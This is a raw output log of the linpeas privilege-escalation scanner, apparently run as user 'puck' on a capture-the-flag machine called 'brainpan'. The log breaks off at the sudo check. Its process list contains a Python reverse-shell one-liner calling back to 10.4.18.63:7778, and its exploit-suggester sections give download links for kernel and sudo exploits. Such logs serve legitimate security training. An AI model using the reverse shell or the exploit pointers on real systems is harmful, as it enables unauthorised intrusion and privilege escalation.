```
$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                          
                               ╚═══════════════════╝                                                                                                         
OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013
User & Groups: uid=1002(puck) gid=1002(puck) groups=1002(puck)
Hostname: brainpan
Writable folder: /run/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                       
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                               
                                                                                                                                                             
                                                                                                                                                             

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                             
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                           
                              ╚════════════════════╝                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                           
Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013               
Distributor ID: Ubuntu
Description:    Ubuntu 12.10
Release:        12.10
Codename:       quantal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                              
Sudo version 1.8.5p2                                                                                                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                      
/usr/bin:/bin                                                                                                                                                

╔══════════╣ Date & uptime
Wed Dec 20 19:23:01 CST 2023                                                                                                                                 
 19:23:01 up  1:15,  0 users,  load average: 0.16, 0.05, 0.10

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                         

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                    
UUID=aa42f0b1-2b4e-4fad-a39c-e7a977e1391e       /       ext4    errors=remount-ro       0 1                                                                  
UUID=f94ae293-4f16-493b-b252-6b277377d8b7       none    swap    sw      0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                      
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                              
HISTFILESIZE=0
LOGONSERVER=\\brainpan
ALLUSERSPROFILE=C:\users\Public
SHLVL=2
HOME=/home/puck
OLDPWD=/home
PROMPT=$P$G
PROCESSOR_IDENTIFIER=x86 Family 6 Model 45 Stepping 7, GenuineIntel
WINEPATH=C:\windows\system32;C:\windows;C:\windows\system32\wbem
PROCESSOR_REVISION=2d07
ProgramFiles=C:\Program Files
USERDOMAIN=brainpan
CLIENTNAME=Console
PROCESSOR_ARCHITECTURE=x86
LOGNAME=puck
_=./linpeas.sh
USERNAME=puck
LOCALAPPDATA=C:\users\puck\Local Settings\Application Data
WINETEMP=C:\users\puck\Temp
SESSIONNAME=Console
PATH=/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin
SystemDrive=c:
windir=C:\windows
OS=Windows_NT
winsysdir=C:\windows\system32
NUMBER_OF_PROCESSORS=2
USERPROFILE=C:\users\puck
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
APPDATA=C:\users\puck\Application Data
SHELL=/bin/sh
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
WINETMP=C:\users\puck\Temp
LESSCLOSE=/usr/bin/lesspipe %s %s
CommonProgramFiles=C:\Program Files\Common Files
SYSTEMROOT=C:\windows
PWD=/home/puck
HOMEDRIVE=C:
HOMEPATH=\users\puck
HISTFILE=/dev/null
PROCESSOR_LEVEL=6
ComSpec=C:\windows\system32\cmd.exe

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                       
dmesg Not Found                                                                                                                                              
                                                                                                                                                             
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                           
cat: write error: Broken pipe                                                                                                                                
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4699] ptrace/sysret

   Details: http://www.openwall.com/lists/oss-security/2014/07/08/16
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/34134

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2013-1959] userns_root_sploit

   Details: http://www.openwall.com/lists/oss-security/2013/04/29/1
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/25450

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                      
  [1] dirty_cow                                                                                                                                              
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [4] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131
  [5] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [6] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                     
═╣ PaX bins present? .............. PaX Not Found                                                                                                            
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                     
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                       
═╣ Seccomp enabled? ............... disabled                                                                                                                 
═╣ User namespace? ................ disabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes                                                                                                                      

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                          
                                   ╚═══════════╝                                                                                                             
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                                               
╔══════════╣ Container details                                                                                                                               
═╣ Is this a container? ........... No                                                                                                                       
═╣ Any running containers? ........ No                                                                                                                       
                                                                                                                                                             

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                          
                                     ╚═══════╝                                                                                                               
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                           
                ╚════════════════════════════════════════════════╝                                                                                           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                  
root         1  0.0  0.0   3500  1856 ?        Ss   18:07   0:00 /sbin/init                                                                                  
root       323  0.0  0.0   2820   876 ?        S    18:07   0:00 upstart-udev-bridge --daemon[0m
root       327  0.0  0.0   3180  1348 ?        Ss   18:07   0:00 /sbin/udevd --daemon[0m
root       535  0.0  0.0   3048   916 ?        S    18:07   0:00  _ /sbin/udevd --daemon[0m
root       540  0.0  0.0   3048   920 ?        S    18:07   0:00  _ /sbin/udevd --daemon[0m
102        412  0.0  0.0   3248  1072 ?        Ss   18:07   0:00 dbus-daemon[0m --system --fork
syslog     449  0.0  0.0  30048  1356 ?        Sl   18:07   0:00 rsyslogd -c5
root       656  0.0  0.0   2816   596 ?        S    18:07   0:00 upstart-socket-bridge --daemon[0m
root       699  0.0  0.1   5492  2344 ?        Ss   18:07   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       721  0.0  0.1  18832  3588 ?        Ss   18:07   0:00 /usr/sbin/winbindd -F
root       880  0.0  0.0  18832  1300 ?        S    18:08   0:00  _ /usr/sbin/winbindd -F
root       791  0.0  0.0   4632   844 tty4     Ss+  18:07   0:00 /sbin/getty -8 38400 tty4
root       793  0.0  0.0   4632   848 tty5     Ss+  18:07   0:00 /sbin/getty -8 38400 tty5
root       799  0.0  0.0   4632   852 tty2     Ss+  18:07   0:00 /sbin/getty -8 38400 tty2
root       800  0.0  0.0   4632   848 tty3     Ss+  18:07   0:00 /sbin/getty -8 38400 tty3
root       804  0.0  0.0   4632   848 tty6     Ss+  18:07   0:00 /sbin/getty -8 38400 tty6
root       811  0.0  0.0   2620   800 ?        Ss   18:08   0:00 cron
root       887  0.0  0.0   3180  1140 ?        S    18:09   0:00  _ CRON
puck       888  0.0  0.0   2232   544 ?        Ss   18:09   0:00      _ /bin/sh -c /home/puck/checksrv.sh
puck       889  0.0  0.0   5176  1292 ?        S    18:09   0:00          _ /bin/bash /home/puck/checksrv.sh
puck       895  0.0  0.1 1595508 2504 ?        S    18:09   0:00              _ /home/puck/web/bin/brainpan.exe                                      
puck       901  0.0  0.2  12396  6064 ?        S    18:09   0:00              _ /usr/bin/python -m SimpleHTTPServer 10000
daemon[0m     813  0.0  0.0   2476   124 ?        Ss   18:08   0:00 atd
root       872  0.0  0.0   4632   848 tty1     Ss+  18:08   0:00 /sbin/getty -8 38400 tty1
puck       904  0.0  0.1   6272  3200 ?        Ss   18:09   0:00 /usr/bin/wineserver
puck       910  0.0  0.1 1597932 2780 ?        Sl   18:09   0:00 C:windowssystem32services.exe                                      
puck       914  0.0  0.1 1598308 2688 ?        Sl   18:09   0:00 C:windowssystem32winedevice.exe MountMgr                                      
puck       923  0.0  0.1 1596660 2380 ?        Sl   18:09   0:00 C:windowssystem32plugplay.exe                                      
puck       932  0.0  0.2 1605852 5124 ?        S    18:09   0:00 cmd                                      
puck       969  0.0  0.0   2232   576 ?        S    18:12   0:00 sh
puck      1015  0.0  0.2  11076  5828 ?        S    18:16   0:00  _ python3 -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.18.63",7778));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
puck      1016  0.0  0.0   2232   544 pts/0    Ss   18:16   0:00      _ /bin/sh
puck      1027  0.0  0.2  10616  5060 pts/0    S+   18:17   0:00          _ python3 -c import pty;pty.spawn("/bin/bash")
puck      1028  0.0  0.1   6156  2684 pts/1    Ss   18:17   0:00              _ /bin/bash
puck     17371  0.3  0.0   2772  1192 pts/1    S+   19:22   0:00                  _ /bin/sh ./linpeas.sh
puck     21120  0.0  0.0   2772   680 pts/1    S+   19:23   0:00                      _ /bin/sh ./linpeas.sh
puck     21124  0.0  0.0   5200  1192 pts/1    R+   19:23   0:00                      |   _ ps fauxwww
puck     21123  0.0  0.0   2772   680 pts/1    S+   19:23   0:00                      _ /bin/sh ./linpeas.sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                 
                                                                                                                                                             
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                    
Proc 412 with ppid 1 is run by user messagebus but the ppid user is root                                                                                     
Proc 449 with ppid 1 is run by user syslog but the ppid user is root
Proc 813 with ppid 1 is run by user daemon but the ppid user is root
Proc 888 with ppid 887 is run by user puck but the ppid user is root
Proc 904 with ppid 1 is run by user puck but the ppid user is root
Proc 910 with ppid 1 is run by user puck but the ppid user is root
Proc 914 with ppid 1 is run by user puck but the ppid user is root
Proc 923 with ppid 1 is run by user puck but the ppid user is root
Proc 932 with ppid 1 is run by user puck but the ppid user is root
Proc 969 with ppid 1 is run by user puck but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                           
COMMAND     PID TID       USER   FD      TYPE     DEVICE SIZE/OFF   NODE NAME                                                                                

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                           
gdm-password Not Found                                                                                                                                       
gnome-keyring-daemon Not Found                                                                                                                               
lightdm Not Found                                                                                                                                            
vsftpd Not Found                                                                                                                                             
apache2 Not Found                                                                                                                                            
sshd Not Found                                                                                                                                               
                                                                                                                                                             
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                       
/usr/bin/crontab                                                                                                                                             
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
* * * * * /home/puck/checksrv.sh
incrontab Not Found
-rw-r--r-- 1 root root     722 Jun 14  2012 /etc/crontab                                                                                                     

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Mar  4  2013 .
drwxr-xr-x 94 root root 4096 Dec 20 18:07 ..
-rw-r--r--  1 root root  102 Jun 14  2012 .placeholder

/etc/cron.daily:
total 68
drwxr-xr-x  2 root root  4096 Mar  4  2013 .
drwxr-xr-x 94 root root  4096 Dec 20 18:07 ..
-rwxr-xr-x  1 root root 15466 Oct 16  2012 apt
-rwxr-xr-x  1 root root   314 Oct  4  2012 aptitude
-rwxr-xr-x  1 root root   355 Jun 18  2012 bsdmainutils
-rwxr-xr-x  1 root root   256 Oct  1  2012 dpkg
-rwxr-xr-x  1 root root   372 Oct  2  2012 logrotate
-rwxr-xr-x  1 root root  1365 Sep 18  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 14  2012 mlocate
-rwxr-xr-x  1 root root   249 Sep  6  2012 passwd
-rw-r--r--  1 root root   102 Jun 14  2012 .placeholder
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 14  2012 standard
-rwxr-xr-x  1 root root   214 Oct  9  2012 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar  4  2013 .
drwxr-xr-x 94 root root 4096 Dec 20 18:07 ..
-rw-r--r--  1 root root  102 Jun 14  2012 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar  4  2013 .
drwxr-xr-x 94 root root 4096 Dec 20 18:07 ..
-rw-r--r--  1 root root  102 Jun 14  2012 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar  4  2013 .
drwxr-xr-x 94 root root 4096 Dec 20 18:07 ..
-rwxr-xr-x  1 root root  730 Aug 17  2012 apt-xapian-index
-rwxr-xr-x  1 root root  907 Sep 18  2012 man-db
-rw-r--r--  1 root root  102 Jun 14  2012 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
* * * * * /home/puck/checksrv.sh

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                               
                                                                                                                                                             
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                  
You can't write on systemd PATH                                                                                                                              

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                    
                                                                                                                                                             
╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                    
                                                                                                                                                             
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                   
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                           
/lib/systemd/system/dbus.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                   
sed: -e expression #1, char 0: no previous regular expression                                                                                                
/com/ubuntu/upstart
/dev/log
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/udev/control
  └─(Read )
/tmp/.winbindd/pipe
  └─(Read Write)
/tmp/.wine-1002/server-ca01-21bec/socket
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/samba/winbindd_privileged/pipe

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                     
                                                                                                                                                             
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                     
busctl Not Found                                                                                                                                             
                                                                                                                                                             

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                          
                              ╚═════════════════════╝                                                                                                        
╔══════════╣ Hostname, hosts and DNS
brainpan                                                                                                                                                     
127.0.0.1       localhost
127.0.1.1       brainpan

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                          
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:dd:0e:19:86:75  
          inet addr:10.10.245.229  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::dd:eff:fe19:8675/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:7448 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5340 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:4499170 (4.4 MB)  TX bytes:3331871 (3.3 MB)
          Interrupt:74 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:16 errors:0 dropped:0 overruns:0 frame:0
          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:960 (960.0 B)  TX bytes:960 (960.0 B)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      895/brainpan.exe                                                             
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      901/python      

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                           
                                                                                                                                                             


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                          
                               ╚═══════════════════╝                                                                                                         
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                     
uid=1002(puck) gid=1002(puck) groups=1002(puck)                                                                                                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                 
netpgpkeys Not Found
netpgp Not Found                                                                                                                                             
                                                                                                                                                             
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
